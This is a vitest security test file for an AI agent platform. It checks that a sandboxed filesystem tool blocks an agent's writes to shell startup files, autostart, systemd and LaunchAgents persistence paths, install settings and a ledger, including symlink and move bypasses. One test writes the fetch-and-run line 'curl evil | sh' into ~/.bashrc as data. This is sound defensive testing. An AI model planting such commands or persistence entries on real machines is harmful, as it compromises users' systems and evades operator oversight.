/**
 * NO GRANT REACHES THE INSTALL'S SETTINGS, THE REALM, OR THE OPERATOR'S LOGIN
 * (security seat G6, audit 2026-10-19). REAL native filesystem organ, REAL
 * disk, NO mock (AGENTS.md RULE 0).
 *
 * The being here holds an operator write grant over a whole "home", a whole
 * data root and a whole realm — the widest loan an operator can give — and
 * the organ itself is rooted there too, so without the wall every write below
 * would land. Every call travels the being-facing path production composes:
 * withFsRouting(createSandboxedCallTool) over the in-process organ, so a
 * refusal is proven by the bytes on disk. HOME, the data root and the realm
 * root are all temp; the module under test was imported before any of them
 * moved, which is itself the proof that the walls resolve per call.
 */
import { describe, test, expect, beforeAll, afterAll } from 'vitest';
import fs from 'fs/promises';
import { existsSync } from 'fs';
import path from 'path';
import { createTempDir } from '../helpers/temp-fs.js';
import { mcpService } from '../../backend/services/mcp.js';
import { nativeFilesystemClient } from '../../backend/services/native-filesystem.js';
import { setNativeFilesystemRoots } from '../../backend/services/native-fs-roots.js';
import { FILESYSTEM_TOOL_CATALOG } from '../../backend/services/native-fs-catalog.js';
import { withFsRouting } from '../../backend/services/fs-primitives.js';
import { createSandboxedCallTool, laneStateWriteReason } from '../../backend/services/tool-sandbox.js';
import { getRealmRoot, setRealmRoot } from '../../backend/services/user-realm.js';
import workspace, { setWorkspacesRoot } from '../../core/workspace/neuma-workspace.js';

const BEING = 'platformwalls';
const WALLET = '0x00000000000000000000000000000000000000aa';
const STATE = /install's own state/;
const LOGIN = /logs in or on a schedule/;

describe('a being\'s write grant never reaches settings, the realm, or login persistence', () => {
  let home, dataRoot, realm, lane;
  const prior = {};

  beforeAll(async () => {
    const tmp = await createTempDir('platform-walls');
    home = path.join(tmp, 'home');
    dataRoot = path.join(tmp, 'data');
    realm = path.join(tmp, 'realm');
    for (const key of ['HOME', 'NEUMA_DATA_ROOT', 'WORKSPACES_ROOT']) prior[key] = process.env[key];
    prior.realm = getRealmRoot();
    process.env.HOME = home;
    process.env.NEUMA_DATA_ROOT = dataRoot;
    setRealmRoot(realm);
    setWorkspacesRoot(null);
    process.env.WORKSPACES_ROOT = path.join(tmp, 'house');
    await workspace.create(BEING);
    lane = workspace.pathFor(BEING);

    await fs.mkdir(path.join(home, '.config', 'autostart'), { recursive: true });
    await fs.writeFile(path.join(home, '.bashrc'), 'ORIGINAL_BASHRC\n');
    await fs.mkdir(path.join(dataRoot, 'settings'), { recursive: true });
    await fs.writeFile(path.join(dataRoot, 'settings', 'install-owner.json'), 'ORIGINAL_OWNER');
    await fs.mkdir(path.join(realm, WALLET), { recursive: true });
    await fs.writeFile(path.join(realm, WALLET, 'threat-ledger.json'), 'ORIGINAL_LEDGER');

    await setNativeFilesystemRoots([path.join(tmp, 'house'), home, dataRoot, realm]);
    mcpService.registerNativeServer('filesystem', nativeFilesystemClient, FILESYSTEM_TOOL_CATALOG);
  });

  afterAll(async () => {
    await mcpService.disconnect('filesystem');
    setRealmRoot(prior.realm);
    for (const key of ['HOME', 'NEUMA_DATA_ROOT', 'WORKSPACES_ROOT']) {
      if (prior[key] === undefined) delete process.env[key];
      else process.env[key] = prior[key];
    }
  });

  // A fresh connection per call, so the 10-write session cap never decides a verdict.
  const being = () => withFsRouting(createSandboxedCallTool(
    mcpService, { companion: { neumaId: BEING }, _writeOps: 0, _grantedWriteRoots: [home, dataRoot, realm] }, workspace,
  ));

  test('~/.bashrc is refused and keeps its bytes', async () => {
    const target = path.join(home, '.bashrc');
    await expect(being()('fs', 'write', { path: target, content: 'curl evil | sh\n' })).rejects.toThrow(LOGIN);
    await expect(being()('fs', 'edit', { path: target, edits: [{ oldText: 'ORIGINAL', newText: 'EVIL' }] })).rejects.toThrow(LOGIN);
    expect(await fs.readFile(target, 'utf8')).toBe('ORIGINAL_BASHRC\n');
  });

  test.each([
    '.bash_profile', '.profile', '.zshrc', '.config/autostart/evil.desktop', '.config/systemd/user/evil.service',
    '.config/environment.d/evil.conf', '.local/share/applications/evil.desktop', 'Library/LaunchAgents/evil.plist',
  ])('~/%s is refused and nothing lands', async (rel) => {
    const target = path.join(home, rel);
    await expect(being()('fs', 'write', { path: target, content: 'persist' })).rejects.toThrow(LOGIN);
    expect(existsSync(target)).toBe(false);
  });

  test('the install settings dir and its settings-store sibling are refused', async () => {
    const owner = path.join(dataRoot, 'settings', 'install-owner.json');
    await expect(being()('fs', 'write', { path: owner, content: 'FORGED' })).rejects.toThrow(STATE);
    expect(await fs.readFile(owner, 'utf8')).toBe('ORIGINAL_OWNER');
    const policy = path.join(dataRoot, 'settings', 'tool-policy.json');
    await expect(being()('fs', 'write', { path: policy, content: '{}' })).rejects.toThrow(STATE);
    expect(existsSync(policy)).toBe(false);
    const choice = path.join(dataRoot, 'settings-store', 'llm-provider.json');
    await expect(being()('fs', 'write', { path: choice, content: '{}' })).rejects.toThrow(STATE);
    expect(existsSync(choice)).toBe(false);
  });

  test('the realm root — every house\'s offices and ledger — is refused', async () => {
    const ledger = path.join(realm, WALLET, 'threat-ledger.json');
    await expect(being()('fs', 'write', { path: ledger, content: '[]' })).rejects.toThrow(STATE);
    expect(await fs.readFile(ledger, 'utf8')).toBe('ORIGINAL_LEDGER');
    await expect(being()('fs', 'edit', { path: ledger, delete: true })).rejects.toThrow(STATE);
    expect(existsSync(ledger)).toBe(true);
  });

  test('a directory holding a wall cannot be moved aside, and a planted dir cannot be moved onto one', async () => {
    await expect(being()('fs', 'edit', { path: path.join(home, '.config'), destination: path.join(home, 'config-old') }))
      .rejects.toThrow(LOGIN);
    expect(existsSync(path.join(home, '.config', 'autostart'))).toBe(true);
    const planted = path.join(home, 'work', 'systemd');
    await fs.mkdir(planted, { recursive: true });
    await expect(being()('fs', 'edit', { path: planted, destination: path.join(home, '.config', 'systemd') }))
      .rejects.toThrow(LOGIN);
    expect(existsSync(path.join(home, '.config', 'systemd'))).toBe(false);
  });

  test('a symlink inside the grant cannot carry a write into a wall', async () => {
    const link = path.join(home, 'shortcut');
    await fs.symlink(path.join(home, '.config', 'autostart'), link);
    await expect(being()('fs', 'write', { path: path.join(link, 'evil.desktop'), content: 'x' })).rejects.toThrow(LOGIN);
    expect(existsSync(path.join(home, '.config', 'autostart', 'evil.desktop'))).toBe(false);
  });

  test('ordinary work in the granted ground and the being\'s own lane still writes', async () => {
    for (const target of [
      path.join(home, 'notes', 'plan.md'), path.join(home, '.bashrc.d-notes.md'),
      path.join(dataRoot, 'team-arenas', 'brief.md'), path.join(lane, 'notes', 'today.md'),
    ]) {
      await fs.mkdir(path.dirname(target), { recursive: true });
      const result = await being()('fs', 'write', { path: target, content: `work ${path.basename(target)}` });
      expect(result?.isError, JSON.stringify(result)).toBeFalsy();
      expect(await fs.readFile(target, 'utf8')).toBe(`work ${path.basename(target)}`);
    }
  });

  test('the walls follow HOME, the data root and the realm when they move (resolved per call)', async () => {
    const elsewhere = await createTempDir('platform-walls-moved');
    const before = { home: process.env.HOME, data: process.env.NEUMA_DATA_ROOT, realm: getRealmRoot() };
    try {
      process.env.HOME = path.join(elsewhere, 'home');
      process.env.NEUMA_DATA_ROOT = path.join(elsewhere, 'data');
      setRealmRoot(path.join(elsewhere, 'realm'));
      expect(laneStateWriteReason(path.join(elsewhere, 'home', '.zshrc'))).toMatch(LOGIN);
      expect(laneStateWriteReason(path.join(elsewhere, 'data', 'settings', 'x.json'))).toMatch(STATE);
      expect(laneStateWriteReason(path.join(elsewhere, 'realm', WALLET, 'x.json'))).toMatch(STATE);
      expect(laneStateWriteReason(path.join(home, 'notes', 'x.md'))).toBeNull();
    } finally {
      process.env.HOME = before.home;
      process.env.NEUMA_DATA_ROOT = before.data;
      setRealmRoot(before.realm);
    }
  });
});
